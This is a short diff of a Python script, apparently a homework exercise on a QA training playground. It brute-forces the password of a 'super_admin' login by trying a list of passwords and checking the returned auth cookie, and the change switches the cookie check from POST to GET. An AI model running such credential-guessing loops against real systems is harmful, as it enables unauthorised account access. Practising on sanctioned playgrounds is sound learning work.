@@ -7,7 +7,7 @@ for tryPassword in listOfPassword:
     sendLoginAndPassword = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
                         data={"login": "super_admin", "password": tryPassword})
     saveCookie = sendLoginAndPassword.cookies.get("auth_cookie")
-    checkAuthCookie = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies={"auth_cookie": saveCookie})
+    checkAuthCookie = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies={"auth_cookie": saveCookie})
     if checkAuthCookie.text == "You are authorized":
         print("Correct Password = " + tryPassword)
         break
